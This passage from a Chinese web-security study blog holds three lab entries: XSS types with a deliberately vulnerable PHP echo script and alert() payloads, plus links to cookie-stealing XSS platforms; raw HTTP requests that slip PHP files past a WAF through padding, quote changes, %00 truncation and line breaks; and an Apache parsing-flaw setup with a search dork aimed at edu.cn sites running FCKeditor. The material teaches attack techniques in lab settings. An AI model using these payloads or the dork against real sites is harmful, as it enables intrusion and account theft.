        <content type="html"><![CDATA[<h2 id="WEB漏洞-XSS跨站之原理分类及攻击手法"><a href="#WEB漏洞-XSS跨站之原理分类及攻击手法" class="headerlink" title="WEB漏洞-XSS跨站之原理分类及攻击手法"></a><font size="6"><strong>WEB漏洞-XSS跨站之原理分类及攻击手法</strong></font></h2><span id="more"></span><h3 id="一、思维导图"><a href="#一、思维导图" class="headerlink" title="一、思维导图"></a><font size="5"><strong>一、思维导图</strong></font></h3><p><img src="/2023/10/08/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-025/1.png"></p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#XSS跨站漏洞产生原理，危害，特点?</span>本质，产生层面，函数类，漏洞操作对应层，危害影响，浏览器内核版本等<span class="token comment" spellcheck="true">#Xss跨站漏洞分类:反射，存储，DOM</span>从产生层面，具体区别，危害等级等讲解<span class="token comment" spellcheck="true"># 'onclick="alert (2) "></span><span class="token comment" spellcheck="true">#xss常规攻击手法:平台，工具，结合其他等</span></code></pre><h4 id="1-js执行"><a href="#1-js执行" class="headerlink" title="1. js执行"></a><font size="4"><strong>1. js执行</strong></font></h4><p>Js是浏览器执行的前端语言，用户在存在xss漏洞的站点url后者能输入数据的部分插入js语言，服务器接收到此数据，认为是js代码，从而返回的时候执行。因此，攻击者可利用这个漏洞对站点插入任意js代码进行窃取用户的信息。</p><h4 id="2-xss攻击"><a href="#2-xss攻击" class="headerlink" title="2. xss攻击"></a><font size="4"><strong>2. xss攻击</strong></font></h4><p>XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。<br>对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p><h4 id="3-XSS攻击的危害"><a href="#3-XSS攻击的危害" class="headerlink" title="3. XSS攻击的危害"></a><font size="4"><strong>3. XSS攻击的危害</strong></font></h4><p>● 1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号<br>● 2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力<br>● 3、盗窃企业重要的具有商业价值的资料<br>● 4、非法转账<br>● 5、强制发送电子邮件<br>● 6、网站挂马<br>● 7、控制受害者机器向其它网站发起攻击（重定向语句）<br>● 8、窃取cookie的sessionid，冒充登录。<br>XSS攻击利用到最大就需要自己有台服务器用于窃取信息，还要利用一点社工，骗取别人点击恶意的链接。</p><h4 id="4-XSS漏洞的分类"><a href="#4-XSS漏洞的分类" class="headerlink" title="4. XSS漏洞的分类"></a><font size="4"><strong>4. XSS漏洞的分类</strong></font></h4><p><strong>1.DOM型(不经过服务器，前端js代码的利用)：</strong><br>本地利用漏洞，这种漏洞存在于页面中客户端脚本自身。其攻击过程如下所示：<br>Alice给Bob发送一个恶意构造了Web的URL。<br>Bob点击并查看了这个URL。<br>恶意页面中的JavaScript打开一个具有漏洞的HTML页面并将其安装在Bob电脑上。<br>具有漏洞的HTML页面包含了在Bob电脑本地域执行的JavaScript。<br>Alice的恶意脚本可以在Bob的电脑上执行Bob所持有的权限下的命令。</p><p><strong>2.反射型：</strong><br>这种漏洞和类型A有些类似，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能够注入到动态页面中。<br>其攻击过程如下：<br>Alice经常浏览某个网站，此网站为Bob所拥有。Bob的站点运行Alice使用用户名&#x2F;密码进行登录，并存储敏感信息(比如银行帐户信息)。<br>Charly发现Bob的站点包含反射性的XSS漏洞。<br>Charly编写一个利用漏洞的URL，并将其冒充为来自Bob的邮件发送给Alice。<br>Alice在登录到Bob的站点后，浏览Charly提供的URL。<br>嵌入到URL中的恶意脚本在Alice的浏览器中执行，就像它直接来自Bob的服务器一样。此脚本盗窃敏感信息(授权、信用卡、帐号信息等)然后在Alice完全不知情的情况下将这些信息发送到Charly的Web站点。</p><p><strong>3.存储型（长久型，危害最大）：</strong><br>该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。其攻击过程如下：<br>Bob拥有一个Web站点，该站点允许用户发布信息&#x2F;浏览已发布的信息。<br>Charly注意到Bob的站点具有类型C的XSS漏洞。<br>Charly发布一个热点信息，吸引其它用户纷纷阅读。<br>Bob或者是任何的其他人如Alice浏览该信息，其会话cookies或者其它信息将被Charly盗走。<br>类型A直接威胁用户个体，而类型B和类型C所威胁的对象都是企业级Web应用。</p><p>创建1.PHP然后访问传参</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>?php<span class="token variable">$xss</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$xss</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><p><img src="/2023/10/08/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-025/2.png"></p><h3 id="二、搭建靶场"><a href="#二、搭建靶场" class="headerlink" title="二、搭建靶场"></a><font size="5"><strong>二、搭建靶场</strong></font></h3><pre class=" language-bash"><code class="language-bash">$ docker run -d -p 80:80 --name pikachu area39/pikachu</code></pre><p>反射型<br><img src="/2023/10/08/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-025/3.png"></p><p>存储型，每次刷新的时候都会弹框<br><img src="/2023/10/08/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-025/4.png"></p><h3 id="三、随意留言板搭建"><a href="#三、随意留言板搭建" class="headerlink" title="三、随意留言板搭建"></a><font size="5"><strong>三、随意留言板搭建</strong></font></h3><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>BODY onload<span class="token operator">=</span><span class="token string">"alert('xss')"</span><span class="token operator">></span></code></pre><p><img src="/2023/10/08/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-025/5.png"><br><img src="/2023/10/08/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-025/6.png"></p><h3 id="四、涉及资源："><a href="#四、涉及资源：" class="headerlink" title="四、涉及资源："></a><font size="5"><strong>四、涉及资源：</strong></font></h3><p>xss平台:<a href="https://xss8.cc/bdstatic.com/">https://xss8.cc/bdstatic.com/</a><br><a href="https://xss8.cc/xss.php?do=login">https://xss8.cc/xss.php?do=login</a><br><a href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a><br><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a><br><a href="http://down.chinaz.com/soft/37581.htm">http://down.chinaz.com/soft/37581.htm</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-024</title>
      <link href="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/"/>
      <url>/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-文件上传之WAF绕过及安全修复"><a href="#WEB漏洞-文件上传之WAF绕过及安全修复" class="headerlink" title="WEB漏洞-文件上传之WAF绕过及安全修复"></a><font size="6"><strong>WEB漏洞-文件上传之WAF绕过及安全修复</strong></font></h2><span id="more"></span><p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/1.png"></p><h3 id="一、上传参数名解析"><a href="#一、上传参数名解析" class="headerlink" title="一、上传参数名解析"></a><font size="5"><strong>一、上传参数名解析</strong></font></h3><pre class=" language-bash"><code class="language-bash">明确有哪些东西能修改:Content-Disposition:一般可更改name:表单参数值，不能更改filename :文件名，可以更改Content-Type:文件MIME，视情况更改</code></pre><h3 id="二、常见的绕过方法"><a href="#二、常见的绕过方法" class="headerlink" title="二、常见的绕过方法"></a><font size="5"><strong>二、常见的绕过方法</strong></font></h3><pre class=" language-bash"><code class="language-bash">数据溢出-防匹配<span class="token punctuation">(</span>xxx<span class="token punctuation">..</span> .<span class="token punctuation">)</span>符号变异-防匹配（'" <span class="token punctuation">;</span><span class="token punctuation">)</span>数据截断-防匹配<span class="token punctuation">(</span>%00 <span class="token punctuation">;</span>换行<span class="token punctuation">)</span>重复数据-防匹配<span class="token punctuation">(</span>参数多次<span class="token punctuation">)</span></code></pre><h3 id="三、pikachu-安全狗绕过"><a href="#三、pikachu-安全狗绕过" class="headerlink" title="三、pikachu+安全狗绕过"></a><font size="5"><strong>三、pikachu+安全狗绕过</strong></font></h3><p><a href="https://www.cnblogs.com/shley/p/14800623.html">https://www.cnblogs.com/shley/p/14800623.html</a></p><h4 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a><font size="4"><strong>数据溢出</strong></font></h4><p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/2.png"></p><p>正常上传的情况<br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/3.png"></p><p>被安全狗拦截的情况<br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/4.png"></p><p>修改数据包上传Content-Disposition: form-data; name&#x3D;”uploadfile”;中间插入大量的垃圾数据从而绕过。<br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/5.png"></p><p>%00截断</p><p>使用%00截断，添加合法后缀名<br>格式：文件名.php%00.png<br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/6.png"></p><h4 id="改变符号"><a href="#改变符号" class="headerlink" title="改变符号"></a><font size="4"><strong>改变符号</strong></font></h4><p>去掉双引号</p><pre class=" language-bash"><code class="language-bash">POST /vul/unsafeupload/servercheck.php HTTP/1.1Host: 10.1.1.6:88User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------276594773132894662704244861418Content-Length: 367Origin: http://10.1.1.6:88Connection: closeReferer: http://10.1.1.6:88/vul/unsafeupload/servercheck.phpCookie: PHPSESSID<span class="token operator">=</span>e405r8e634hhjk7su64ofmjknlUpgrade-Insecure-Requests: 1-----------------------------276594773132894662704244861418Content-Disposition: form-data<span class="token punctuation">;</span>name<span class="token operator">=</span><span class="token string">"uploadfile"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span>info4.phpContent-Type: image/jpeg<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>-----------------------------276594773132894662704244861418Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span>å¼å§ä¸ä¼ -----------------------------276594773132894662704244861418--</code></pre><p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/7.png"></p><p>只使用一个双引号，成功上传文件info5.php</p><pre class=" language-bash"><code class="language-bash">POST /vul/unsafeupload/servercheck.php HTTP/1.1Host: 10.1.1.6:88User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------276594773132894662704244861418Content-Length: 368Origin: http://10.1.1.6:88Connection: closeReferer: http://10.1.1.6:88/vul/unsafeupload/servercheck.phpCookie: PHPSESSID<span class="token operator">=</span>e405r8e634hhjk7su64ofmjknlUpgrade-Insecure-Requests: 1-----------------------------276594773132894662704244861418Content-Disposition: form-data<span class="token punctuation">;</span>name<span class="token operator">=</span><span class="token string">"uploadfile"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"info5.phpContent-Type: image/jpeg&lt;?php phpinfo(); ?>-----------------------------276594773132894662704244861418Content-Disposition: form-data; name="</span>submit"å¼å§ä¸ä¼ -----------------------------276594773132894662704244861418--</code></pre><p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/8.png"></p><h3 id="四、uploads-安全狗绕过"><a href="#四、uploads-安全狗绕过" class="headerlink" title="四、uploads+安全狗绕过"></a><font size="5"><strong>四、uploads+安全狗绕过</strong></font></h3><h4 id="数据溢出-1"><a href="#数据溢出-1" class="headerlink" title="数据溢出"></a><font size="4"><strong>数据溢出</strong></font></h4><pre class=" language-bash"><code class="language-bash">POST /Pass-06/index.php?action<span class="token operator">=</span>show_code HTTP/1.1Host: 10.1.1.6User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------219208409912899756444268510117Content-Length: 378Origin: http://10.1.1.6Connection: closeReferer: http://10.1.1.6/Pass-06/index.php?action<span class="token operator">=</span>show_codeUpgrade-Insecure-Requests: 1-----------------------------219208409912899756444268510117Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span>填充大量的垃圾数据<span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"info.Php"</span>Content-Type: application/octet-stream<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>-----------------------------219208409912899756444268510117Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span>涓婁紶-----------------------------219208409912899756444268510117--</code></pre><p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/9.png"></p><h4 id="改变符号-1"><a href="#改变符号-1" class="headerlink" title="改变符号"></a><font size="4"><strong>改变符号</strong></font></h4><pre class=" language-bash"><code class="language-bash">POST /Pass-02/index.php?action<span class="token operator">=</span>show_code HTTP/1.1Host: 10.1.1.6User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------156187617541967037312717027348Content-Length: 363Origin: http://10.1.1.6Connection: closeReferer: http://10.1.1.6/Pass-02/index.php?action<span class="token operator">=</span>show_codeUpgrade-Insecure-Requests: 1-----------------------------156187617541967037312717027348Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"info.phpContent-Type: image/jpeg&lt;?php phpinfo(); ?>-----------------------------156187617541967037312717027348Content-Disposition: form-data; name="</span>submit"涓婁紶-----------------------------156187617541967037312717027348--</code></pre><p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/10.png"></p><pre class=" language-bash"><code class="language-bash">POST /Pass-02/index.php?action<span class="token operator">=</span>show_code HTTP/1.1Host: 10.1.1.6User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------156187617541967037312717027348Content-Length: 362Origin: http://10.1.1.6Connection: closeReferer: http://10.1.1.6/Pass-02/index.php?action<span class="token operator">=</span>show_codeUpgrade-Insecure-Requests: 1-----------------------------156187617541967037312717027348Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span>info.phpContent-Type: image/jpeg<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>-----------------------------156187617541967037312717027348Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span>涓婁紶-----------------------------156187617541967037312717027348--</code></pre><p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/11.png"></p><p>%00截断</p><pre class=" language-bash"><code class="language-bash">POST /Pass-02/index.php?action<span class="token operator">=</span>show_code HTTP/1.1Host: 10.1.1.6User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------156187617541967037312717027348Content-Length: 371Origin: http://10.1.1.6Connection: closeReferer: http://10.1.1.6/Pass-02/index.php?action<span class="token operator">=</span>show_codeUpgrade-Insecure-Requests: 1-----------------------------156187617541967037312717027348Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"info.php%00.png"</span>Content-Type: image/jpeg<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>-----------------------------156187617541967037312717027348Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span>涓婁紶-----------------------------156187617541967037312717027348--</code></pre><p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/12.png"></p><h4 id="换行执行"><a href="#换行执行" class="headerlink" title="换行执行"></a><font size="4"><strong>换行执行</strong></font></h4><pre class=" language-bash"><code class="language-bash">POST /Pass-02/index.php?action<span class="token operator">=</span>show_code HTTP/1.1Host: 10.1.1.6User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">;</span> rv:83.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,image/webp,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,zh-TW<span class="token punctuation">;</span>q<span class="token operator">=</span>0.7,zh-HK<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data<span class="token punctuation">;</span> boundary<span class="token operator">=</span>---------------------------156187617541967037312717027348Content-Length: 368Origin: http://10.1.1.6Connection: closeReferer: http://10.1.1.6/Pass-02/index.php?action<span class="token operator">=</span>show_codeUpgrade-Insecure-Requests: 1-----------------------------156187617541967037312717027348Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"upload_file"</span><span class="token punctuation">;</span> filename<span class="token operator">=</span><span class="token string">"x.php"</span>Content-Type:  image/jpeg<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span>-----------------------------156187617541967037312717027348Content-Disposition: form-data<span class="token punctuation">;</span> name<span class="token operator">=</span><span class="token string">"submit"</span>涓婁紶-----------------------------156187617541967037312717027348--</code></pre><p><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/13.png"><br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/14.png"></p><h3 id="五、fuzz字典"><a href="#五、fuzz字典" class="headerlink" title="五、fuzz字典"></a><font size="5"><strong>五、fuzz字典</strong></font></h3><p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a><br><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a><br><a href="https://github.com/TuuuNya/fuzz_dict">https://github.com/TuuuNya/fuzz_dict</a><br><a href="https://github.com/jas502n/fuzz-wooyun-org">https://github.com/jas502n/fuzz-wooyun-org</a><br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/15.png"><br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/16.png"><br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/17.png"><br><img src="/2023/10/07/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-024/18.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-023</title>
      <link href="/2023/10/06/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-023/"/>
      <url>/2023/10/06/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-023/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB漏洞-文件上传之解析漏洞编辑器安全"><a href="#WEB漏洞-文件上传之解析漏洞编辑器安全" class="headerlink" title="WEB漏洞-文件上传之解析漏洞编辑器安全"></a><font size="6"><strong>WEB漏洞-文件上传之解析漏洞编辑器安全</strong></font></h2><span id="more"></span><pre class=" language-bash"><code class="language-bash">各个平台解析漏洞讲解IIS,Apache , Nginx各个wEB编辑器安全讲解https://navisec.it/编辑器漏洞手册/各个cMS文件上传简要讲解wordpress, phpcms</code></pre><h3 id="一、apache解析漏洞"><a href="#一、apache解析漏洞" class="headerlink" title="一、apache解析漏洞"></a><font size="5"><strong>一、apache解析漏洞</strong></font></h3><p>环境搭建：<a href="https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/">https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/</a></p><pre class=" language-bash"><code class="language-bash">jiang@ubuntu:/opt/vulhub/vulhub-master/httpd/apache_parsing_vulnerability$ docker-compose up -d/home/jiang/.local/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="token keyword">for</span> it is now deprecated <span class="token keyword">in</span> cryptography, and will be removed <span class="token keyword">in</span> the next release.  from cryptography.hazmat.backends <span class="token function">import</span> default_backendStarting apache_parsing_vulnerability_apache_1 <span class="token punctuation">..</span>. <span class="token keyword">done</span></code></pre><p><img src="/2023/10/06/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-023/1.png"><br><img src="/2023/10/06/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-023/2.png"></p><h3 id="二、常见的编辑器"><a href="#二、常见的编辑器" class="headerlink" title="二、常见的编辑器"></a><font size="5"><strong>二、常见的编辑器</strong></font></h3><pre class=" language-bash"><code class="language-bash">fckeditorexpueditor 漏洞利用</code></pre><p>在网上找fckeditor漏洞inurl:fckeditor site:edu.cn<br><a href="https://blog.csdn.net/eldn__/article/details/9197521">https://blog.csdn.net/eldn__/article/details/9197521</a></p><h3 id="三、几种常见CMS文件上传简要演示"><a href="#三、几种常见CMS文件上传简要演示" class="headerlink" title="三、几种常见CMS文件上传简要演示"></a><font size="5"><strong>三、几种常见CMS文件上传简要演示</strong></font></h3><pre class=" language-bash"><code class="language-bash">通达oA系统https://pan.baidu.com/s/15gcdBuOFrN1F9xVN7Q7GSA 密码enqx</code></pre><h3 id="四、贴近实际应用下的以上知识点演示"><a href="#四、贴近实际应用下的以上知识点演示" class="headerlink" title="四、贴近实际应用下的以上知识点演示"></a><font size="5"><strong>四、贴近实际应用下的以上知识点演示</strong></font></h3><pre class=" language-bash"><code class="language-bash">判断中间件平台，编辑器类型或CMS名称进行测试</code></pre><h3 id="五、涉及资源"><a href="#五、涉及资源" class="headerlink" title="五、涉及资源"></a><font size="5"><strong>五、涉及资源</strong></font></h3><p><a href="https://www.jb51.net/softs/75619.html">https://www.jb51.net/softs/75619.html</a><br><a href="https://pan.baidu.com/share/init?surl=5gcdBuOFrN1F9xVN7Q7GSA">https://pan.baidu.com/share/init?surl=5gcdBuOFrN1F9xVN7Q7GSA</a> enqx</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全日志-022</title>
      <link href="/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/"/>
      <url>/2023/10/05/web%E5%AE%89%E5%85%A8%E6%97%A5%E5%BF%97-022/</url>
      
